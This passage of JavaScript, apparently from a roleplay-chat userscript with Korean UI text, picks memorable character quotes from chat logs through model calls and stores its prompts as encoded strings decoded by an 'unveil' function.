5ifgc78gfjpT57qmdm7lhhKg8Hpid/bmMmtEgEH3NrzisjZTYT24cGujNmf3k+K4PlNg+/BwbGx3pbrg/zVRYfd8ZKbst22hkqE2+2O5stcWcCrpN6o+q3WgebshP75Dd6tht3M643w5U00nuSV2ZyOa4b48U2J8+eZ87kS3K+CgcnlTY/a15n1rdmRrhhgNI3b+YbP1yQN3qy2Fof39IHu8IPv4Q3elLbdzeNPTYnN85nThPCH3rLOhMvop9qDz+3GoazZjv6EwPBFh9f6lYqyHhLa6eeKzPlNhcHZxpeMEt3m743vyYff8lnBpbbeqtaEyNlFh9fClYyGENmc74Tt7Ynvw5nckRLahY6B4+GGxPFPnuqZ2buWGA==');
  async function makeQuotes(from, to, onlyWho = '') {
    const chatId = chatIdFromPath(); if (!chatId || busyNow || !snapshot) return;
    busyNow = true; render(); toast('대화를 읽는 중이에요…');
    try {
      // 1턴부터면 첫 인사(시작 장면)도 넣음
      let t = 0; const msgs = (await readAll(chatId)).filter(m => { if (msgRole(m) === 'user') t++; return isChat(m) && t >= (from === 1 ? 0 : from) && t <= to; });
      if (!msgs.length) { toast('그 범위에 대화가 없어요.', 'info', 3000); return; }
      toast(`명대사를 고르는 중이에요… (${from}~${to}턴)`);
      const old = quotes(), names = snapshot?.note ? personsIn(bodyOf('인물')).map(p => p.name).join(', ') : '(노트 없음 · 로그에서 읽을 것)';
      const input = `[인물] ${names}\n\n[기존 명대사 — 이미 있음. 다시 쓰지 말고 새로 고른 대사만 출력]\n${old.map(quoteLine).join('\n') || '(없음)'}\n\n[새 RP 로그 ${from}~${to}턴]\n${msgs.map(m => `[${msgRole(m) === 'user' ? 'USER' : 'AI'}]\n${cleanLog(msgText(m))}`).join('\n\n')}\n\n[개수 규칙 — 반드시 지킬 것] ${onlyWho ? `${onlyWho}이(가) 직접 한 대사만 정확히 4개. 다른 인물 대사는 출력 금지.` : '인물당 최대 1개. 이 구간에서 비중이 큰 주요 인물 2~3명의 대사만 총 2~3개. 모든 NPC에서 하나씩 뽑지 말 것.'}\n\n[출력 형식 — 반드시 지킬 것] 대사마다 정확히 이 3줄: 첫 줄 화자 → 상대: \"원문 대사\" / 둘째 줄 번역: 한국어 번역 / 셋째 줄 장면: 날짜 · 장소 · 상황. 번역을 별표로 감싸 같은 줄에 붙이지 말 것. 대사 원문이 한국어면 번역 줄을 쓰지 말 것.`;
      let body = (await askModel(QUOTE_PROMPT, input, '✨명대사')).replace(/^\s*■\s*명대사\s*\n?/, '').trim();
      body = dropUserQuotes(`■ 명대사\n${body}`, msgs).replace(/^■ 명대사\n?/, '').trim();
      const prevStore = quoteStore; quoteStore = body; const got = quotes(); quoteStore = prevStore;
      const key = q => String(q.text).replace(/[\s"“”'‘’.,!?…~]/g, '');
      let add = got.filter(q => q.text && !old.some(o => key(o) === key(q)));
      if (onlyWho) { const ow = canon(onlyWho); add = add.filter(q => q.who === ow || sameName(q.who, ow)).slice(0, 4); }
      else { const seenW = new Set(); add = add.filter(q => { const w = q.who || '?'; if (seenW.has(w)) return false; seenW.add(w); return true; }).slice(0, 3); }
      if (!add.length) { toast('새로 고를 만한 대사가 없었어요.', 'info', 3000); return; }
      // 영어 대사인데 번역이 없으면 강제로 채웁니다 (AI 1번 더, 빠진 것만 한꺼번에)
      const needTr = add.filter(q => /[A-Za-z]/.test(q.text) && !/[가-힣]/.test(q.text) && !q.tr && !splitTr(q.text)[1]);
      if (needTr.length) {
        try {
          toast('번역이 빠진 대사를 번역하는 중이에요…');
          const out = await askModel('영어 대사를 자연스러운 한국어 구어체로 번역한다. 입력은 번호가 붙은 줄이다. 출력은 같은 번호로 "번호. 번역" 한 줄씩만. 설명·따옴표·별표 금지. 말투·욕설 수위는 원문 그대로.', needTr.map((q, i) => `${i + 1}. ${q.text}`).join('\n'), '✨명대사 번역');
          for (const l of String(out).split('\n')) { const m = l.match(/^\s*(\d+)\s*[.)]\s*(.+)$/); if (m && needTr[Number(m[1]) - 1]) needTr[Number(m[1]) - 1].tr = m[2].replace(/^[\s"“”*]+|[\s"“”*]+$/g, ''); }
        } catch (e) { toast('번역 채우기 실패 · ' + e.message, 'err'); }
      }
      await saveQuotes(chatId, [...old, ...add]);
      toast(`명대사 ${add.length}개를 더했어요 ✨`, 'ok', 2500);
    } catch (e) { toast('명대사 뽑기 실패 · ' + e.message, 'err'); }
    finally { busyNow = false; render(); }
  }


  const PHONE_PROMPT = unveil('gevphu/5TyApDd6Kot3Mwozp1YHy6lnBp7Teq96C7t1Fgen/lbC2EN6R7oPG8Ynf95nmkRLajI6BxtFNjt7bnu6BEtyRioHl9U2I4cNSlZCq3bemhtfBTYnz/pjJrdm7lhhKNIvV1YH5x1nGt4jfvNIyjfD9TYPw1cG5lPCBhuvQh9fErcWSiqLdupqo2IvZ5Yfc9rua2ICi2sr6jenFr9ie8rHekKLa/f9BhsLzg8TJARLclbaGz/SA8PFPnuSV2ZyOFof6/U2Ox+qe5LUS3b2GSoTj2Yn3xp7kqRLblbqB/MGG7slBUpWmltySqkqD/NWJ58uf+q3wh96j7oP82Y7E+57ysd6XsvTdhOrUj9rTsM7Gm6TZnMJPjfjUgfL2WcahlN6hxoTqyY7e25nzuRLagLWG3fmG+tFPnvqw3rOv2//3i9/pQ2UplYqy3bCaSoXT7jhnQlKbtbcQ3oP2g/vdienPWpKmltuXjkqEy8WO/s9SkoGK3KyTgdzVhu7JT5nRkd6Qsh9QT43xxYHP8pW0shDZtPKE6eVFhuPylLSm27iiSoPB5Y7h71KSir7boZKGyOFNifjlmfO52buWGEqD/c2Jze+e4K3eraoWgcb1ge7xg9X5xoKZ8IEuIordzK/Yn/+Y36mmFoDX0YbE8IPv+Q3epbba8udBhsLhhOHdwZWwEtr/5YvexUFPnuWN3pCy3NrvQYH22U+Z9b7YiLL03YTI+Ynm857erfCHdnuB4OVNjsrjmeqJ3peyFob664bv+YT53QMS27meh+nAhtXEg+XpxrikEtr2z43N5YbKzlnGtpPekepPjfjvhuXmkqaWHhLa99tBgfjVhN7Fwa+EEtr2z43N5YH44lnGvrDfo95PjPXZgfHiWcGSsd6r6k+KxPGGxdqSr6oQfGYphODRjsvDUpWxktyStoHK3U2O/P+Yyo0S3aeugeX1TY7K/5n2qR4Q2bPSguvVifD3UpWvntqDgqjYiuHlge3elbqiENiB0oTt7Y7M81KVs7rbuKJKg/zRjsrjUpW+htu5kkRlTE2J78Oe8okS2oGWhs/0V0WB8sqSgY7cr65KhdLpj9XmsM7BlbHYjuOt1oHC7IPD/O+F27CuhvLVr9KByPOVurfyhdrs443r6K/YmM2t2IO29N2C+dWJ1MKe5K0Sa9iO2oP32EWG6sqUp4pt3qH6T43N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